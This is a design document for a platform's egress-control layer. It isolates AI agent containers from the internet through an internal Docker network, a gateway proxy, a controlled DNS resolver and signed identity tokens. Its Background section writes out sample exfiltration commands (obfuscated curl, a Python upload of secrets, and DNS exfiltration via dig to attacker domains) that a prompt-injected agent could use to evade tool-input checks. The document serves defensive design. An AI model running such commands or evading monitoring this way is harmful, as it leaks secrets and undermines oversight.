# Egress Control Architecture

This document explains RoleMesh's Egress Control module — the design that, on top of Container Hardening and the Safety Framework, funnels **all outbound traffic from agent containers** through **network-layer physical isolation + a controlled Gateway + a controlled DNS resolver**.

It covers why the tool-input-layer URL check from the Safety Framework alone is not enough, why network-layer default-deny is mandatory, why a controlled DNS resolver is required rather than optional, the migration relationship with the existing `credential_proxy`, and what V1 deliberately leaves out.

Target audience: developers implementing Egress Control; future developers extending egress rules, introducing TLS intercept, or migrating the Gateway to Firecracker / Kata; operators wondering "how is the agent still reaching the internet." Prerequisite: [`13-safety-overview.md`](13-safety-overview.md) §2.2, [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md), [`15-safety-framework-architecture.md`](15-safety-framework-architecture.md).

> **Status**: This document describes the V1 design, **not yet implemented**. Container Hardening and Safety Framework V1 are already merged and are prerequisites of Egress Control.

---

## Background: Residual Risk

Container Hardening blocks "container escape." Safety Framework V1 blocks "observably-malicious tool events." But agent containers can still, business-wise:

1. Use `Bash + curl` to send arbitrary HTTP to any IP / domain
2. Use `python -c "urllib.request.urlopen(...)"` to bypass any tool-layer detection
3. Use `dig $secret.attacker.com` to exfiltrate data via DNS queries (DNS exfiltration — the most common data-exfiltration path for agent prompt-injection attacks)
4. Connect directly to internal-network ranges (except IPs already metadata-blackholed)

The `domain_allowlist` check in the Safety Framework V2 design scans URLs in tool input, but has three structural bypass paths:

**Bypass 1: Bash tool morphing**
```
Bash(command="curl $(echo aHR0cHM6Ly9ldmlsLmNvbQ== | base64 -d)")
```
Recognizing the URL inside tool_input requires a shell parser + variable resolution + encoding recognition — you will never catch up to the attacker's morph speed.

**Bypass 2: Write + Exec**
```
Step 1: Write(/tmp/x.py, "import urllib.request; urlopen('https://evil.com', data=open('/workspace/secrets').read())")
Step 2: Bash("python /tmp/x.py")
```
Two separate steps, each with seemingly innocent tool input.

**Bypass 3: DNS exfiltration**
```
Bash("dig $(base64 /workspace/secrets | head -c 63).attacker-dns.com")
```
This is not HTTP at all — it does not pass through any HTTP proxy, nor does any URL field appear in tool input.

All three are **real, industry-demonstrated attack shapes** (multiple Simon Willison and Invariant Labs blog posts). Blocking them requires moving the control point from "application layer" down to "**network layer + DNS layer**" — no matter how the agent morphs, the moment a packet leaves the container, we control it.

---

## Design Goals

1. **Network-layer default-deny.** Agent containers **physically** have no route to the internet — not relying on an application layer "please do not access" but on a kernel-level reachability cut.
2. **Controlled DNS resolver.** Agent containers' DNS queries can only resolve allowlisted domains, closing the DNS exfiltration channel.
3. **Reuse the Safety Framework's policy layer.** Domain allowlist is a row in the `safety_rules` table; no new table, no new REST routing — leverage Safety's existing audit / multi-tenancy / hot update / pydantic validation for free.
4. **Preserve existing LLM credential-injection semantics.** Anthropic / OpenAI / other LLM endpoints continue to inject credentials via reverse proxy; agents do not notice.
5. **Fail-closed by default.** Gateway unavailable = all agent egress fails (no silent fallback to allow).
6. **Cross-platform consistency.** Linux native Docker / macOS Docker Desktop / Windows WSL behave the same; no reliance on environment-specific features.
7. **Zero business-behavior change.** Agent workflows with allowlists properly configured do not notice the Gateway; only violations return 403.

---

## Considered Alternatives

### Alternative A — Rely Only on the Safety Framework's Tool-Input domain_allowlist

Pure application-layer defense, do not touch the network layer.

**Pros**: Simple implementation, no network-topology changes.

**Cons**: All three structural bypass paths above remain open — once an agent is compromised by prompt injection, "preventing exfiltration" is empty words. The `domain_allowlist` in the Safety Framework is "preventing accidents and low-skill prompt injection," not "preventing adversarial attacks."

**Rejected** — violates [`13-safety-overview.md`](13-safety-overview.md) §5.2 "assume prompt injection will succeed."

### Alternative B — Run iptables / nftables Inside Each Agent Container

The classic approach: inside the container, write iptables rules dropping all egress except to the proxy.

**Pros**: Each container manages itself; no Docker network model changes needed.

**Cons**: Writing rules into kernel netfilter requires `CAP_NET_ADMIN`. Container Hardening explicitly says `CapDrop=ALL` ([`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) R3), and we cannot open this hole for Egress — `NET_ADMIN` would also allow modifying ARP, taking down NICs, all kinds of in-container attacks.

**Rejected** — conflicts with the established container-hardening direction.

### Alternative C — Docker `--internal` Network + DMZ Gateway (Selected)

Change `rolemesh-agent-net` to `--internal` (a native Docker capability: dockerd will not add a default route to that network). The Gateway container holds both `rolemesh-agent-net` and a new `rolemesh-egress-net` (a normal bridge with internet), forming a bastion / DMZ pattern: the Gateway is the agents' sole exit.

**Pros**:
- `--internal` is a Docker native capability — iptables rules auto-managed by dockerd, zero operator burden
- **No capability needed in the container at all** — isolation enforced at the host layer
- Cross-platform consistent (Docker behaves the same across OSes)
- Even on full agent compromise, **no route to the internet exists** — disconnected at the kernel level

**Cons**:
- credential_proxy currently runs on the host; agents reach it via `host.docker.internal` — after switching to `--internal`, that path stops working, requiring **containerization** of credential_proxy onto both `rolemesh-agent-net` + `rolemesh-egress-net` NICs
- One more network-management responsibility

**Selected** — this is the shape the rest of this document describes.

### Alternative D — Firecracker microVM, Fully Isolated

Each agent runs in an independent microVM.

**Pros**: Hardware-level isolation.

**Cons**: Same rejection rationale as alternative B in [`14-container-hardening-architecture.md`](14-container-hardening-architecture.md) — rewrites the container orchestration layer, not in V1.

**Rejected (V1)** — long-term V2+ candidate.

---

## Seven-Layer Defense Model and Coverage

When discussing egress control, the industry often uses a "seven-layer defense" model. This module's V1 coverage:

| Layer | Topic | V1 Coverage |
|---|---|---|
| L1 Network-layer default-deny | No default route to internet from container | ✅ Complete (Docker `--internal`) |
| L2 DNS control | Controlled resolver + domain allowlist + metadata blackhole | ✅ Complete (controlled DNS resolver) |
| L3 URL / HTTP method control | Decrypt HTTPS to inspect URL path / method | ⚠️ Partial (reverse-proxy can see path; CONNECT mode only at domain level; TLS intercept deferred to V2) |
| L4 Header control | Strip sensitive headers | ⚠️ Partial (continues credential_proxy's existing hop-by-hop stripping) |
| L5 Body scan (secret / PII) | Inspect outbound request body content | ❌ V2 |
| L6 Traffic quota | Size cap / rate limit | ❌ Explicitly out (user decision) |
| L7 Response ingress check | Inspect downloaded content | ❌ V2 |

V1's boundary is to **"close the data-exfiltration channels" — L1 + L2 complete + L3/L4 partial on reverse proxy**. L5/L7 is "fine-grained detection," deferred to V2 when integrated with Safety Framework's content-scan checks; L6 is decoupled from Safety Framework rate_limit and is a standalone future task.

---

## Three-Layer Architecture

```
┌─────────────────────────────────────────────────────────┐
│  Application Layer                                       │
│   Safety Framework PRE_TOOL_CALL checks (V2)             │
│   ── Intercepts "honest" URLs in tool input; accident    │
│      prevention                                           │
├─────────────────────────────────────────────────────────┤
│  Gateway Layer (EC-2 + EC-3)                             │
│   * Forward proxy (HTTP CONNECT) — SNI / CONNECT host    │
│   * Reverse proxy — credential injection (existing)      │
│                     + domain allowlist                    │
│   * Controlled DNS resolver — close DNS exfil            │
│   * EGRESS_REQUEST stage check entry                      │
│   * Audit writes safety_decisions                         │
├─────────────────────────────────────────────────────────┤
│  Network Layer (EC-1)                                    │
│   * rolemesh-agent-net → --internal — no external route  │
│   * New rolemesh-egress-net — Gateway external NIC       │
│   * Gateway containerized, dual-homed (DMZ pattern)      │
│   * Agent's Dns points directly to Gateway IP            │
└─────────────────────────────────────────────────────────┘
```

### Network Topology

```
┌── Host ──────────────────────────────────────────────────┐
│                                                          │
│  ┌── rolemesh-agent-net (bridge, --internal) ────────┐  │
│  │  no default route to outside                       │  │
│  │                                                    │  │
│  │   agent-coworker-A   agent-coworker-B   ...        │  │
│  │   ICC=false  containers cannot reach each other    │  │
│  │   Dns: <egress-gateway IP on this net>             │  │
│  │   HTTPS_PROXY: http://egress-gateway:3128          │  │
│  │                          │                         │  │
│  │                          ▼                         │  │
│  │   ┌──── egress-gateway (container, dual NIC) ───┐ │  │
│  │   │  port 53/udp   - DNS resolver                │ │  │
│  │   │  port 3001/tcp - reverse proxy (creds)       │ │  │
│  │   │  port 3128/tcp - forward proxy (CONNECT)     │ │  │
│  │   └──────────────────────────────────────────────┘ │  │
│  └────────────────────────────│───────────────────────┘  │
│                               │                          │
│  ┌── rolemesh-egress-net (bridge) ────────────────────┐ │
│  │   Normal bridge, default route present             │ │
│  └──────────────────│─────────────────────────────────┘ │
│                     ▼                                    │
│                  Internet                                │
└──────────────────────────────────────────────────────────┘
```

### Request Paths

**Reverse proxy (LLM credential injection, preserved behavior)**:
```
agent → http://egress-gateway:3001/anthropic/v1/messages
      ↓ Gateway extracts domain api.anthropic.com
      ↓ Safety pipeline (EGRESS_REQUEST stage)
      ↓ allow → inject ANTHROPIC_API_KEY → HTTPS forward to api.anthropic.com
      → response returned along the same path
```

**Forward proxy (arbitrary egress)**:
```
agent container env: HTTPS_PROXY=http://egress-gateway:3128
agent sends https://github.com/...
  ↓ TCP connect egress-gateway:3128
  ↓ send CONNECT github.com:443 HTTP/1.1
  ↓ Gateway: Safety pipeline (EGRESS_REQUEST, host=github.com)
  ↓ allow → 200 Connection Established → open TCP tunnel
  ↓ agent ↔ github.com end-to-end TLS (Gateway does not decrypt)
```

**DNS path** (platform policy — see "DNS plane: platform-level policy" below):
```
agent: dig metrics.corp.example      # on EGRESS_DNS_ALLOWLIST
  ↓ UDP 53 → Gateway-internal DNS resolver
  ↓ platform allowlist match (identity-free, identical for all tenants)
  ↓ allow → recursive query upstream → return A record

agent: dig evil.com
  ↓ UDP 53 → Gateway-internal DNS resolver
  ↓ platform allowlist miss → block
  ↓ Return NXDOMAIN, do not query upstream
  ↓ ★ Attacker-controlled DNS receives nothing
```

### DNS plane: platform-level policy (not per-tenant)

The DNS resolver originally re-used the per-tenant `egress.domain_rule`
rows via the source-IP identity map. That coupling was retired: DNS
decisions now come from a single platform-wide allowlist
(`EGRESS_DNS_ALLOWLIST`, default **empty**), with an `EGRESS_DNS_MODE`
of `enforce` (default) or `observe` (resolve everything, log would-be
blocks; migration aid only).

Why platform-level is sufficient — and why the list stays empty:

- Proxied traffic never resolves its target inside the agent
  container. With `HTTP_PROXY` set, the SDK hands the hostname to the
  gateway as a string (CONNECT request line / absolute-form URL) and
  the **gateway** resolves it on its own egress-side resolver path,
  which this policy does not touch. Per-tenant access control happens
  at the CONNECT / reverse-proxy layer, unchanged.
- Container names (`nats`, `egress-gateway`) are answered locally by
  Docker's embedded DNS (127.0.0.11); only external names are
  forwarded to the gateway resolver.
- Therefore every query that reaches this resolver comes from code
  bypassing the proxy convention — a tool missing proxy config, or a
  DNS-exfiltration attempt. Allowing a name here rescues no legitimate
  flow (the bridge has no route to the resolved address); the resolver
  is a **tripwire**, not a service. Fix proxy-unaware tools at the
  tool, not by widening this list.
- Tenant self-service must not reach this list: a malicious tenant
  allowlisting an attacker-controlled apex would otherwise open a DNS
  exfil channel usable by *every* tenant's compromised agents. The
  list is operator-set (env), with `platform_safety_rules` as the
  upgrade path if runtime editing is ever needed.

Audit consequence: DNS decisions are recorded as structured gateway
logs (qname redacted past the registered domain) rather than
`safety_decisions` rows — platform-level decisions carry no per-agent
identity for the audit fan-in's coworker re-validation. The
HTTP planes retain full per-tenant audit attribution; a DNS-exfil
attempt almost always pairs with an attributed CONNECT block.

### HTTP-plane identity: signed tokens (not source IP)

The forward and reverse proxies originally recovered an agent's
identity by mapping its bridge IP through an in-memory table fed by
NATS `orchestrator.agent.lifecycle` events. That scheme is being
replaced by **stateless signed tokens** (`egress/token_identity.py`):

- The orchestrator mints an HMAC-SHA256 token per spawn carrying the
  full identity (tenant / coworker / user / conversation / job) plus an
  expiry, and injects it into the agent's proxy env — in the
  forward-proxy URL userinfo (`HTTP_PROXY=http://job:<token>@gateway`,
  emitted as `Proxy-Authorization: Basic`) and as a leading path
  segment on each reverse-proxy base URL (`/proxy/<token>/<provider>`).
- The gateway verifies the token with the shared `EGRESS_TOKEN_SECRET`
  and reads identity straight out of it — no shared state, no event
  stream, no lookup table. Verification is a pure function.

Why: the IP scheme couples identity to L3 topology (breaks under NAT /
k8s / multi-host) and to a distributed-state pipeline whose every
failure mode is a silent 401 (lost lifecycle event → permanent 401
until the next gateway restart). A token travels in-band, so identity
is established the instant the container starts and survives a gateway
restart with zero recovery.

TTL and recycling: a token is a bearer credential, bounded by
`EGRESS_TOKEN_TTL_SECONDS` (default 7 days). Because a session container
can outlive any fixed window, the orchestrator re-mints by recycling
the container at a message boundary before the token ages out — so
expiry never lands mid-turn, and the gateway stays a stateless
verifier. The secret lives only on the orchestrator and gateway (shared
`.env`), never inside an agent container.

Identity is token-only: the gateway reads it solely from the verified
token (the leading reverse-proxy path segment, or the forward proxy's
`Proxy-Authorization`). There is no source-IP fallback — a request with
no/invalid token has no identity and is refused. (This replaced a
dual-run window where the gateway also consulted a NATS-fed source-IP
map; that pipeline — lifecycle events, the identity snapshot RPC, the
in-memory IP→identity table — was removed once token coverage reached
100% with zero token-vs-IP disagreement.)

Client gotcha — proxy-auth method: clients must present the token
*proactively* in the `Proxy-Authorization` header. Most do
(curl/httpx/requests/urllib/undici all send Basic from the proxy URL
userinfo), but **git** defaults to `http.proxyAuthMethod=anyauth`,
which waits for a `407` challenge before sending credentials. The agent
image therefore pins `git config --system http.proxyAuthMethod basic`
so git sends the token up front. Any other anyauth client added later
needs the same treatment.

The `407` challenge: a forward-proxy CONNECT (or plain HTTP request)
with a missing/invalid token returns `407 Proxy Authentication
Required` with `Proxy-Authenticate: Basic` — **not** `403`. This lets an
anyauth client that withheld credentials retry with them; a client with
no token at all simply fails closed. The connection is closed after the
407 (`Connection: close`), so a retrying client re-dials and re-sends
the CONNECT carrying the token — no keep-alive challenge state machine
is needed. The reverse proxy returns `401` for the same condition (it
is the upstream server, not a proxy, so 401 is the correct status).

---

## Three Independent PRs (EC-1 / EC-2 / EC-3)

Organized "from network up." **No parallelization allowed** — upper layers depend on the lower-layer reachability test before they can merge.

### EC-1: Network-layer Enforcement

**Scope**:
- Change `rolemesh-agent-net` to `--internal`
- Add `rolemesh-egress-net`
- Containerize credential_proxy (skeleton only, no new function) on dual NICs
- Remove `host.docker.internal` ExtraHost from agent container; add `HTTP_PROXY / HTTPS_PROXY / NO_PROXY` env; point `Dns` to the Gateway IP
- Update orchestrator startup order + add `verify_egress_gateway_reachable`

**Merge gate**: All four integration tests pass on Linux native Docker:
1. Inside container, `socket.connect('1.1.1.1', 443)` times out (**core defense**)
2. Metadata `169.254.169.254` unreachable
3. `http://egress-gateway:3001/healthz` returns 200
4. `HTTPS_PROXY` env is injected

If item 1 fails = EC-1 as a whole is pointless.

### EC-2: Gateway Functional Upgrade

**Scope**:
- Forward proxy (HTTP CONNECT) — `src/rolemesh/egress/forward_proxy.py`
- Reverse-proxy business logic moves from `credential_proxy.py` to `src/rolemesh/egress/reverse_proxy.py` (`credential_proxy.py` becomes a thin re-export keeping its public API)
- Controlled DNS resolver — `src/rolemesh/egress/dns_resolver.py` (dnslib-based; reject TXT/ANY/SRV to prevent DNS tunneling)
- Identity — recovered from the per-request signed token (`token_identity.py`); see "HTTP-plane identity: signed tokens" above. (Originally a NATS-fed source-IP → identity map; replaced by tokens.)
- Rule cache — full load at startup + NATS `safety.rule.changed` incremental invalidation
- Lightweight pipeline — `src/rolemesh/egress/safety_call.py` (call Safety Check + write audit inside Gateway)

**Merge gate**:
- CONNECT hitting allowlist → 200 + tunnel; missing → 403
- DNS allowlisted → real IP; outside → NXDOMAIN (and upstream is not contacted)
- DNS qtype=TXT → REFUSED
- Corresponding audit rows in `safety_decisions`

### EC-3: Safety Framework Integration

**Scope**:
- Add `EGRESS_REQUEST` to the Stage enum in `src/rolemesh/safety/types.py`
- Pipeline `_CONTROL_STAGES` includes `EGRESS_REQUEST`
- New check: `src/rolemesh/safety/checks/egress_domain_rule.py` (strictly mirrors `pii_regex.py` structure)
- Register in the orchestrator registry (container-side does not register)
- Zero REST changes — `/api/admin/tenants/{tid}/safety/rules` natively supports `stage='egress_request'`
- NATS publish `safety.rule.changed` after REST CRUD

**Merge gate**: Full E2E scenario — admin configures rule → agent triggers → correct hit/miss behavior → audit has 4 rows (HTTP allow + HTTP block + DNS allow + DNS block) → hot update takes effect (PATCH rule to disable → wait for NATS propagation → next request blocked).

---

## Relationship with the Existing credential_proxy

`credential_proxy.py` (353 LoC) currently runs on the host; agents reach it via `host.docker.internal:3001` for reverse-proxy credential injection. After EC:

- **Business logic** moves to `src/rolemesh/egress/reverse_proxy.py`
- `credential_proxy.py` keeps a thin re-export, **all public APIs (`start_credential_proxy / register_mcp_server / set_token_vault`, etc.) retain their paths** — external imports unchanged
- The Gateway process is containerized, listening on the same 3001 port (inside the Gateway container)
- Agents access it via `http://egress-gateway:3001/...` (Docker's built-in DNS resolves the container name)

**Migrate, not rewrite** — business logic (credential selection, provider registration, token vault) is preserved as-is.

---

## Relationship with the Safety Framework

The EC module **fully reuses** the Safety Framework's existing infrastructure, **does not introduce**:

| Reuse | Do not introduce |
|---|---|
| `safety_rules` table (an egress rule = a row with stage='egress_request') | `egress_policies` table |
| `safety_decisions` table (egress audit goes there) | `egress_decisions` table |
| `/api/admin/tenants/{tid}/safety/rules` REST CRUD | `/api/admin/.../egress/policies` |
| `safety_rules_audit` trigger (rule-change timeline) | Standalone audit |
| Pydantic `config_model` validation | Custom validation |
| Multi-tenant + coworker scope | Reimplemented |

Only new things:
- `EGRESS_REQUEST` added to the Stage enum
- New Check class `EgressDomainRuleCheck`
- Lightweight pipeline inside the Gateway (V1 runs only one check, simpler than agent_runner's pipeline)

This **maximally-reusing** design avoids:
- Two admin UIs / documentation / learning curves
- Two audit sources / reports / permission models
- Two implementations of multi-tenant isolation

The cost is that EC's design is **deeply bound** to the V1 shape of the Safety Framework — major refactors of the latter ripple into the former. This is a consciously accepted tradeoff.

---

## Tradeoffs and Boundaries

### Accepted Tradeoffs

- **The Gateway is a single point of failure**: Gateway down = all tenants' egress fails. V1 mitigates via restart-unless-stopped + monitoring alerts; V2 introduces a double-replica.
- **DNS uses a self-implemented resolver**: introduces a dnslib dependency; not reusing dnsmasq because dnsmasq has no "per-tenant authorization" capability, and self-implementation is simpler.
- **SNI-level rather than URL-level**: HTTPS is not decrypted — `*.github.com` is one-shot; "allow read disallow write" is not possible. TLS intercept deferred to V2, only for domains explicitly marked for it.
- **Rule cache may be briefly stale**: when NATS rule.changed is lost, cache invalidation is delayed until the next background reconcile (5 minutes).

### Explicitly Out of Scope (V1)

- **Request / response size cap** — standalone task; will be evaluated alongside Safety Framework rate_limit
- **Rate limit / quota** — same as above
- **TLS intercept (decrypting HTTPS to see URL/body)** — V2
- **Body content scan (secret/PII)** — V2, reuse Safety Framework's secret_scanner
- **Response ingress check** — V2
- **Header allowlist** — continue with credential_proxy's existing hop-by-hop stripping
- **Gateway HA / multi-replica** — V2
- **Admin UI page** — reuse Safety Framework's rules page (filter stage=egress_request)
- **gVisor support for the Gateway container** — future polishing
- **DoH / DoT** — V3
- **IPv6** — all networks IPv4-only

---

## Risks and Rollback

| Risk | Severity | Mitigation |
|---|---|---|
| Gateway down = all tenants offline | High | restart-unless-stopped + monitoring; V2 double-replica |
| `safety.rule.changed` event lost | Low | Gateway reconciles every 5 minutes (pulls full set, diffs) |
| DNS resolver upstream unreachable | Medium | Configure multiple upstreams (8.8.8.8 + 1.1.1.1 fallback) |
| Docker `--internal` behaves oddly on some dockerd version | High | EC-1 integration test item 1 must pass; CI guards |
| reverse_proxy migration breaks existing LLM calls | High | Strictly preserve `credential_proxy.py` public API; tests cover every provider |

### Turning Egress Control off (`EGRESS_CONTROL_ENABLE=0`)

EC is a single switch, `EGRESS_CONTROL_ENABLE` (default on). Off is a
supported mode, not just an emergency hatch — useful on hosts where
custom Docker bridges or the gateway image aren't available (incl.
Docker Desktop). What changes:

| | EC on | EC off |
|---|---|---|
| Agent bridge | `Internal=true`, no host route | Docker default bridge |
| Egress network control | forward proxy + DNS resolver + isolation | **off** — agent can reach the internet directly |
| Credential injection | gateway container (stateless, remote resolver) | host-side proxy in the orchestrator (local DB resolver) |
| Per-tenant credential isolation | yes | **yes** (preserved) |
| Identity | signed token in request | **signed token in request** (same mechanism) |

The key point: turning EC off drops the **network** controls but keeps
**multi-tenant credential isolation**. That works because identity is a
signed token carried in the request (the reverse-proxy URL path), not an
inference from network position — so the host-side proxy verifies the
same token, recovers the tenant, and injects that tenant's own key.
Tenant A still cannot obtain tenant B's credential.

Because token identity is topology-independent, EC=off also works on
Docker Desktop / WSL, where the old source-IP scheme could not (the VM
NAT hid the real container IP). `EGRESS_TOKEN_SECRET` is required in
both modes.

Form note: the host-side credential proxy listener is bound **only**
when EC is off (that is the one configuration where agents dial it, via
`host.docker.internal:3001`). With EC on, agents reach the gateway
container instead, so no host listener is bound; the MCP-registry /
token-vault wiring that feeds the gateway's snapshot still runs in both
modes.

Migration: the historical `CONTAINER_NETWORK_NAME=""` off-switch is
gone. Set `EGRESS_CONTROL_ENABLE=0` instead; an empty bridge name with
EC on is now a startup error.

---

## In One Sentence

**Egress Control funnels all agent-container outbound (HTTP/HTTPS/DNS) into a declaratively-controllable Gateway through "Docker `--internal` physically severing the route to the internet + a containerized Gateway + a controlled DNS resolver."**

It **does not rewrite** credential_proxy's business logic (migrate, do not rewrite), **does not introduce** new policy tables (reuses the Safety Framework's `safety_rules`), **does not introduce** application-layer trust assumptions (it defends precisely against a post-compromise adversarial agent).

V1 covers L1/L2 + parts of L3/L4 of the seven-layer defense model, closing the DNS exfiltration channel — this is **the last structural hole** in RoleMesh's current defense in depth. Once done, "a compromised agent that cannot get out is the only real security" finally becomes true.
